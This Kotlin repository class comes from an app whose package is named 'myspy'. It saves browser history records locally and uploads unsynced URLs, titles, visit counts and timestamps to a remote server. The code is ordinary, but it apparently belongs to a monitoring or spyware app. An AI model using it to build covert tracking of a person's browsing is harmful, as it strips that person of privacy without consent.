package com.myspy.android.data.repository

import com.myspy.android.data.local.db.dao.BrowserHistoryDao
import com.myspy.android.data.local.db.entities.BrowserHistoryEntity
import com.myspy.android.data.remote.api.ApiService
import com.myspy.android.data.remote.models.BrowserHistoryData
import java.text.SimpleDateFormat
import java.util.*

class BrowserHistoryRepository(
    private val browserHistoryDao: BrowserHistoryDao,
    private val apiService: ApiService
) {

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    suspend fun saveHistory(history: BrowserHistoryEntity): Long =
        browserHistoryDao.insert(history)

    suspend fun saveMultiple(history: List<BrowserHistoryEntity>) {
        browserHistoryDao.insertAll(history)
    }

    suspend fun syncToServer(): Result<Int> {
        return try {
            val unsynced = browserHistoryDao.getUnsyncedHistory()
            if (unsynced.isEmpty()) return Result.success(0)

            val dataList = unsynced.map { entity ->
                BrowserHistoryData(
                    url = entity.url,
                    title = entity.title,
                    visitCount = entity.visitCount,
                    timestamp = dateFormat.format(Date(entity.timestamp))
                )
            }

            val response = apiService.uploadBrowserHistory(dataList)
            if (response.isSuccessful && response.body()?.result == "ok") {
                browserHistoryDao.markAsSynced(unsynced.map { it.id })
                Result.success(unsynced.size)
            } else {
                Result.failure(Exception("Upload failed"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getUnsyncedCount(): Int = browserHistoryDao.getUnsyncedCount()

    suspend fun getRecentHistory(limit: Int = 100): List<BrowserHistoryEntity> =
        browserHistoryDao.getRecentHistory(limit)

    suspend fun deleteOlderThan(days: Int) {
        val timestamp = System.currentTimeMillis() - (days * 24 * 60 * 60 * 1000L)
        browserHistoryDao.deleteOlderThan(timestamp)
    }
}
